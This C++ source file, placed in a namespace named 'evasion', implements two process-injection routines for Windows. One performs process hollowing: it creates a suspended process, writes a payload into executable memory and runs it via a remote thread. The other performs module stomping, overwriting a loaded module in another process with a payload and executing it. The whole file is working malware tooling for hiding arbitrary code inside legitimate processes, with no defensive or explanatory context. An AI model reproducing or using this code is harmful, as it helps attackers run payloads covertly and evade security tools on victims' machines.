#include "Injector.h"
#include <iostream>

namespace evasion {

bool Injector::HollowProcess(const char* targetPath, const std::vector<uint8_t>& payload) {
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    RtlZeroMemory(&si, sizeof(si));
    RtlZeroMemory(&pi, sizeof(pi));
    si.cb = sizeof(si);

    if (!CreateProcessA(NULL, (LPSTR)targetPath, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        return false;
    }

    LPVOID pRemoteBuf = VirtualAllocEx(pi.hProcess, NULL, payload.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!pRemoteBuf) {
        TerminateProcess(pi.hProcess, 0);
        return false;
    }

    if (!WriteProcessMemory(pi.hProcess, pRemoteBuf, payload.data(), payload.size(), NULL)) {
        TerminateProcess(pi.hProcess, 0);
        return false;
    }

    HANDLE hThread = CreateRemoteThread(pi.hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteBuf, NULL, 0, NULL);
    if (!hThread) {
        TerminateProcess(pi.hProcess, 0);
        return false;
    }

    ResumeThread(pi.hThread);

    CloseHandle(hThread);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return true;
}

bool Injector::ModuleStomping(DWORD processId, const char* moduleName, const std::vector<uint8_t>& payload) {
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
    if (!hProcess) return false;

    HMODULE hMod = GetModuleHandleA(moduleName);
    if (!hMod) {
        CloseHandle(hProcess);
        return false;
    }

    if (!WriteProcessMemory(hProcess, (LPVOID)hMod, payload.data(), payload.size(), NULL)) {
        CloseHandle(hProcess);
        return false;
    }

    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)hMod, NULL, 0, NULL);
    if (!hThread) {
        CloseHandle(hProcess);
        return false;
    }

    CloseHandle(hThread);
    CloseHandle(hProcess);
    return true;
}

} // namespace evasion
